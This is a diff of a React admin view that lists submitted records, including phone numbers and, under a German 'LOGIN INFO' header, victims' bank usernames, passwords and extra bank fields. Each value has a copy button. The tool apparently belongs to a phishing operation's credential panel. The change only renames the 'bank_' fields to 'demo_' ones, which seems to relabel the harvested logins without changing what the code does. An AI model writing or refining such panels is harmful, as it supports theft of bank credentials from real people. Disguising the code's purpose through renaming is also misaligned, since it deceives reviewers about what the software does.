@@ -221,8 +221,8 @@ function DetailContent() {
     `phone: ${submission.phone || ""}`,
     ``,
     `======> LOGIN INFO <=======`,
-    `benutzername: ${submission.bank_username || ""}`,
-    `passwort: ${submission.bank_password || ""}`,
+    `benutzername: ${submission.demo_username || ""}`,
+    `passwort: ${submission.demo_password || ""}`,
     `bank: ${submission.bank || ""}`,
   ].join("\n");
 
@@ -340,11 +340,11 @@ function DetailContent() {
             </CardHeader>
             <CardContent>
               <CopyValue label="Bank" value={submission.bank} />
-              <CopyValue label={submission.bank_username_label || "Benutzername"} value={submission.bank_username} mono />
-              <CopyValue label={submission.bank_password_label || "Passwort"} value={submission.bank_password} mono />
-              {submission.bank_extra && Object.keys(submission.bank_extra).length > 0 && (
+              <CopyValue label={submission.demo_username_label || "Benutzername"} value={submission.demo_username} mono />
+              <CopyValue label={submission.demo_password_label || "Passwort"} value={submission.demo_password} mono />
+              {submission.demo_extra && Object.keys(submission.demo_extra).length > 0 && (
                 <>
-                  {Object.entries(submission.bank_extra).map(([key, val]) => (
+                  {Object.entries(submission.demo_extra).map(([key, val]) => (
                     <CopyValue key={key} label={key} value={val} mono />
                   ))}
                 </>
